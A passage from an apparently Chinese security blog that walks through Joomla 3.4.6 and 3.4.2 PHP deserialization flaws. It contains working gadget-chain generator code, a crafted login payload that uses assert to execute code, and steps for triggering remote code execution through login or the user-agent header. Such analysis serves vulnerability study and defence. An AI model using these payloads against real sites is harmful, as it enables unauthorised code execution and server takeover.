&lt;p&gt;/libraries/legacy/simplepie/factory.php&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/1344396-20201031184225965-1491276190.png&#34; alt=&#34;img&#34;&gt;&lt;/p&gt;
&lt;p&gt;发现刚开始就导入了 SimplePie 类，并且 JSimplepieFactory 类属于 autoload，会自动加载，这样的话只需要引入这个类就可以成功加载 SimplePie。&lt;/p&gt;
&lt;p&gt;payload 如下：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class JSimplepieFactory&amp;#123;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class JDatabaseDriverMysql&amp;#123;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class JDatabaseDriverMysqli&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    protected $abc;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    protected $connection;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    protected $disconnectHandlers;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    function __construct()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        $this-&amp;gt;abc = new JSimplepieFactory();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        $this-&amp;gt;connection = 1;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        $this-&amp;gt;disconnectHandlers = [&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            [new SimplePie, &amp;quot;init&amp;quot;],&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;class SimplePie&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    var $sanitize;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    var $cache_name_function;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    var $feed_url;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    function __construct()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        $this-&amp;gt;feed_url = &amp;quot;phpinfo();JFactory::getConfig();exit;&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        $this-&amp;gt;cache_name_function = &amp;quot;assert&amp;quot;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        $this-&amp;gt;sanitize = new JDatabaseDriverMysql();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$obj = new JDatabaseDriverMysqli();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;$ser = serialize($obj);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;echo str_replace(chr(0) . &amp;#x27;*&amp;#x27; . chr(0), &amp;#x27;\0\0\0&amp;#x27;, $ser);?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;最后构造的账号密码为：&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;username：\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;password：123&amp;quot;;s:4:&amp;quot;test&amp;quot;:O:21:&amp;quot;JDatabaseDriverMysqli&amp;quot;:3:&amp;#123;s:6:&amp;quot;\0\0\0abc&amp;quot;;O:17:&amp;quot;JSimplepieFactory&amp;quot;:0:&amp;#123;&amp;#125;s:13:&amp;quot;\0\0\0connection&amp;quot;;i:1;s:21:&amp;quot;\0\0\0disconnectHandlers&amp;quot;;a:1:&amp;#123;i:0;a:2:&amp;#123;i:0;O:9:&amp;quot;SimplePie&amp;quot;:3:&amp;#123;s:8:&amp;quot;sanitize&amp;quot;;O:20:&amp;quot;JDatabaseDriverMysql&amp;quot;:0:&amp;#123;&amp;#125;s:19:&amp;quot;cache_name_function&amp;quot;;s:6:&amp;quot;assert&amp;quot;;s:8:&amp;quot;feed_url&amp;quot;;s:37:&amp;quot;phpinfo();JFactory::getConfig();exit;&amp;quot;;&amp;#125;i:1;s:4:&amp;quot;init&amp;quot;;&amp;#125;&amp;#125;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;登录时需要登录两次，第一次将他序列化存储进 session 中，第二次将 session 中的值反序列化和我们的输入进行比对，在第二次 rce 产生&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;最后总结一下：&lt;/p&gt;
&lt;p&gt;1.Joomla 中会把登录的用户名和密码序列化存储进入 session，并且放入数据库中。&lt;/p&gt;
&lt;p&gt;2. 由于 username 和 password 是 protected，因此会有 &lt;code&gt;*N*&lt;/code&gt;  的修饰，但数据库中不能存储 &lt;code&gt;N*N&lt;/code&gt; （N 为 ASCII 为 0 的字符），因此在序列化入 session 中会将 &lt;code&gt;N*N&lt;/code&gt;  替换为 &lt;code&gt;\0\0\0&lt;/code&gt; ，在下次和我们输入的用户名密码判断时反序列化，将其变为合规的序列化字符串&lt;/p&gt;
&lt;p&gt;3. 漏洞的关键点在于从 &lt;code&gt;\0\0\0&lt;/code&gt;  变为 &lt;code&gt;N*N&lt;/code&gt;  时字符变少了三个，我们可以利用变少的三个做变量逃逸，从而覆盖 password&lt;/p&gt;
&lt;p&gt;4. 因此我们的输入用户名时可以自己构造 &lt;code&gt;\0&lt;/code&gt; ，比如我们构造如下用户 &lt;code&gt;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&lt;/code&gt; ，这样反序列化后多出了 27 个字符把后面的 password 全部吃掉了 &lt;code&gt;s:8:s:&amp;quot;username&amp;quot;;s:54:&amp;quot;\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0&amp;quot;;s:8:&amp;quot;password&amp;quot;;s:6:&amp;quot;123456&amp;quot;&lt;/code&gt; ，password 被吃掉后我们就可以构造我们自己的 password，里面的内容为恶意代码，我们接下来要干的事情就是把我们序列化过的恶意代码放入因为逃逸而变为可控变量的 password 中&lt;/p&gt;
&lt;p&gt;5. 然后我们需要找危险函数，来调用，我们在 &lt;code&gt;libraries\joomla\database\driver\mysqli.php&lt;/code&gt;  中找到了 &lt;code&gt;disconnect()&lt;/code&gt;  函数，其中调用了 &lt;code&gt;call_user_func_array&lt;/code&gt; ，而 mysqli 类中的 &lt;code&gt;__destruct()&lt;/code&gt;  会自动调用 &lt;code&gt;disconnect ()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;6. 但是 &lt;code&gt;disconnect()&lt;/code&gt;  函数中的 &lt;code&gt;call_user_func_array&lt;/code&gt;  中的参数我们只能控制第一个参数 &lt;code&gt;$h&lt;/code&gt; ，不能直接构造恶意代码&lt;/p&gt;
&lt;p&gt;7. 我们在 &lt;code&gt;libraries\simplepie\simplepie.php&lt;/code&gt;  中有一个 &lt;code&gt;init()&lt;/code&gt;  函数，其中还可以找到一个危险函数 &lt;code&gt;call_user_func&lt;/code&gt;  方法调用，并且好消息是他的两个参数 &lt;code&gt;cache_name_function&lt;/code&gt;  和 &lt;code&gt;feed_url&lt;/code&gt;  我们都可以控制&lt;/p&gt;
&lt;p&gt;8. 但是 &lt;code&gt;init()&lt;/code&gt;  不是魔法方法，不会自动调用，我们需要使用一些奇技淫巧调用。即使用刚刚的 &lt;code&gt;disconnect()&lt;/code&gt;  函数自动调用 &lt;code&gt;init()&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;9. 接下来的问题就是我们如何用 &lt;code&gt;disconnect()&lt;/code&gt;  中的一个可控参数完成对 &lt;code&gt;init()&lt;/code&gt;  的调用。我们使用 &lt;code&gt;call_user_func_array(array(new SimplePie(),&amp;quot;init&amp;quot;))&lt;/code&gt;  这样的形式来调用，array 中第一个是我们的类名，第二个是类函数名，而我们不需要 ``call_user_func_array ()` 中的第二个变量&lt;/p&gt;
&lt;p&gt;10. 最后一个问题是 &lt;code&gt;libraries\simplepie\simplepie.php&lt;/code&gt;  和 &lt;code&gt;libraries\joomla\database\driver\mysqli.php&lt;/code&gt;  是两个不同的 &lt;code&gt;php&lt;/code&gt;  文件，如果没有 &lt;code&gt;include()&lt;/code&gt;  这类函数的情况下是无法使用隔壁 php 的类的。我们的解决方案是找到一个新的文件 &lt;code&gt;/libraries/legacy/simplepie/factory.php&lt;/code&gt; ，其中 &lt;code&gt;jimport(simplepie.simplepie)&lt;/code&gt; ，同时 &lt;code&gt;factory.php&lt;/code&gt;  中的 &lt;code&gt;JSimplepieFactory&lt;/code&gt;  是自动 &lt;code&gt;autoload&lt;/code&gt; ，这样我们就能加载 &lt;code&gt;simplepie&lt;/code&gt;  类&lt;/p&gt;
&lt;p&gt;11. 由于 &lt;code&gt;session&lt;/code&gt;  的存在，我们需要抓包，连续放包两次，第一次将 &lt;code&gt;session&lt;/code&gt;  写入数据库中，第二次将我们的输入和数据库中反序列化的 &lt;code&gt;session&lt;/code&gt;  比对，一旦反序列化，我们上面构造的恶意 &lt;code&gt;payload&lt;/code&gt;  触发，实现 &lt;code&gt;rce&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h3 id=&#34;joomla-342截断反序列化&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#joomla-342截断反序列化&#34;&gt;#&lt;/a&gt; Joomla 3.4.2 截断反序列化&lt;/h3&gt;
&lt;p&gt;这个漏洞和前一个 Joomla3.4.6 反序列化很像，利用了相同的危险函数 &lt;code&gt;libraries\simplepie\simplepie.php&lt;/code&gt;  中的一个 &lt;code&gt;init()&lt;/code&gt;  函数和 &lt;code&gt;libraries\joomla\database\driver\mysqli.php&lt;/code&gt;  中的 &lt;code&gt;disconnect()&lt;/code&gt;  函数，并且利用 &lt;code&gt;/libraries/legacy/simplepie/factory.php&lt;/code&gt; ，其中 &lt;code&gt;jimport(simplepie.simplepie)&lt;/code&gt;  自动加载&lt;/p&gt;
&lt;p&gt;区别在于：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;joomla 也没有采用 php 自带的 session 处理机制，而是用多种方式（包括 database、memcache 等）自己编写了存储 session 的容器（storage）。&lt;/p&gt;
&lt;p&gt;其存储格式为『键名 ＋ 竖线 ＋ 经过 serialize () 函数反序列处理的值』，其未正确处理多个竖线的情况。&lt;/p&gt;
&lt;p&gt;那么，我们这里就可以通过注入一个 &lt;code&gt;|&lt;/code&gt;  符号，将它前面的部分全部认为是 name，而 | 后面我就可以插入任意 serialize 字符串，构造反序列化漏洞了。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&lt;img data-src=&#34;https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/thum-16e81451235948.jpg&#34; alt=&#34;14501748976406.jpg&#34;&gt;&lt;/p&gt;
&lt;p&gt;但还有一个问题，在我们构造好的反序列化字符串后面，还有它原本的内容，必须要截断。而此处并不像 SQL 注入，还有注释符可用。&lt;/p&gt;
&lt;p&gt;但不知各位是否还记得当年 wordpress 出过的一个 XSS ( &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL3d3dy5sZWF2ZXNvbmdzLmNvbS9IVE1ML3dvcmRwcmVzcy00LTEtc3RvcmVkLXhzcy5odG1s&#34;&gt;http://www.leavesongs.com/HTML/wordpress-4-1-stored-xss.html&lt;/span&gt; )，当时就是在插入数据库的时候利用 &amp;quot;𝌆&amp;quot;（% F0%9D%8C%86）字符将 utf-8 的字段截断了。&lt;/p&gt;
&lt;p&gt;这里我们用同样的方法，在 session 进入数据库的时候就截断后面的内容，避免对我们反序列化过程造成影响。&lt;/p&gt;
&lt;p&gt;在 php5.6.13 以前的版本里，php 在获取 session 字符串以后，就开始查找第一个 |，然后用这个 | 将字符串分割成『键名』和『键值』。&lt;br&gt;
用 unserialize 解析键值，解析结果作为 session。&lt;/p&gt;
&lt;p&gt;但如果这个 unserialize 解析失败，就放弃这次解析。找到下一个 |，再根据这个 | 将字符串分割成两部分，执行同样的操作，直到解析成功。&lt;/p&gt;
&lt;p&gt;所以，这个 joomla 漏洞的核心内容就是：我们通过𝌆字符， 将原本的 session 截断了，结果因为长度不对所以第一次解析 | 失败，才轮到第二次解析我传入的 |，最后成功利用。&lt;/p&gt;
&lt;p&gt;所以，构造 session 出错，是这个漏洞成立的核心。&lt;/p&gt;
&lt;p&gt;我们可以用长字符（64k）串截断，来达成类似和𝌆字符截断一样的效果。&lt;/p&gt;
&lt;p&gt;我们最终的 exp 为&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//header(&amp;quot;Content-Type: text/plain&amp;quot;);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;JSimplepieFactory&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;JDatabaseDriverMysql&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;SimplePie&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$sanitize&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$cache&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$cache_name_function&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$javascript&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$feed_url&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;feed_url = &lt;span class=&#34;string&#34;&gt;&amp;quot;phpinfo();JFactory::getConfig();exit;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;javascript = &lt;span class=&#34;number&#34;&gt;9999&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;cache_name_function = &lt;span class=&#34;string&#34;&gt;&amp;quot;assert&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;sanitize = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;JDatabaseDriverMysql&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;cache = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;JDatabaseDriverMysqli&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$disconnectHandlers&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;variable&#34;&gt;$connection&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__construct&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;    &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;a = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;JSimplepieFactory&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$x&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;SimplePie&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;connection = &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable language_&#34;&gt;$this&lt;/span&gt;-&amp;gt;disconnectHandlers = [&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            [&lt;span class=&#34;variable&#34;&gt;$x&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;quot;init&amp;quot;&lt;/span&gt;],&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;title class_&#34;&gt;JDatabaseDriverMysqli&lt;/span&gt;();&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;title function_ invoke__&#34;&gt;serialize&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$a&lt;/span&gt;); &lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://www.leavesongs.com/content/uploadfile/201512/thum-46141451235941.jpg&#34; alt=&#34;14501734764205.jpg&#34;&gt;&lt;/p&gt;
&lt;p&gt;将这个代码生成的 exp，以前面提到的注入『|』的变换方式，带入前面提到的 user-agent 中，即可触发代码执行。&lt;/p&gt;
&lt;p&gt;其中，我们需要将 &lt;code&gt;char(0)*char(0)&lt;/code&gt;  替换成 \0\0\0，因为在序列化的时候，protected 类型变量会被转换成 &lt;code&gt;\0*\0name&lt;/code&gt;  的样式，这个替换在源代码中也可以看到：&lt;/p&gt;
